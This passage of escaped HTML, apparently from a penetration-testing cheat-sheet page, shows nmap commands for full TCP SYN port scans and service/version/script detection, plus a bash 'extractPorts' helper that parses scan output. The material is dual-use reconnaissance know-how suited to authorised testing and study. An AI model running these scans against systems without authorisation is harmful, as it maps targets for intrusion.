style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ports.txt\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Parse ports to a -p\u003Cports> format\u003C/ports>\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:70ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">grep\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'^[0-9]'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ports.txt\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">cut\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-d\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'/'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-f1\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">sort\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-u\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">xargs\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">tr\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">','\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Service and Version and NSE Detection Scan\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:57ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sCV\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Pn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p&#x3C;ports>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-iL\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">hosts.txt\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oN\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">scan.txt\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003C/section>\u003Csection>\u003Ch2 id=\"single-target-scan\">Single Target scan\u003Ca class=\"anchor\" href=\"#single-target-scan\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Csection>\u003Ch3 id=\"tcp-port-scan\">TCP Port Scan\u003Ca class=\"anchor\" href=\"#tcp-port-scan\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:57ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Pn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-n\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--min-rate\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">5000\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sS\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;IP>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oN\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ports\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch3 id=\"parse-open-ports\">Parse open ports\u003Ca class=\"anchor\" href=\"#parse-open-ports\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cp>Add this function to .bashrc or .zshrc (Credits to S4vitar)\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:94ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">extractPorts\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> () {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">ports\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"$(\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">cat\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">$1\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">grep\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oP\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> '\\d{1,5}/open' \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">awk\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> '{print $1}' FS='/' \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">xargs\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">tr\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> ' ' ',')\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">ip_address\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"$(\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">cat\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">$1\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">grep\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oP\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">sort\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-u\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">head\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-n\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">)\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">echo\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-e\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"\\n[*] Extracting information...\\n\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">extractPorts.tmp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">echo\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-e\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"\\t[*] IP Address: \u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$ip_address\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">extractPorts.tmp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">echo\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-e\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"\\t[*] Open ports: \u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$ports\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\\n\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">extractPorts.tmp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">echo\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> $ports \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">tr\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-d\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'\\n'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">xclip\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sel\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">clip\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">echo\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-e\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"[*] Ports copied to clipboard\\n\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">extractPorts.tmp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">batcat\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">extractPorts.tmp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:2ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">rm\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">extractPorts.tmp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">11\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 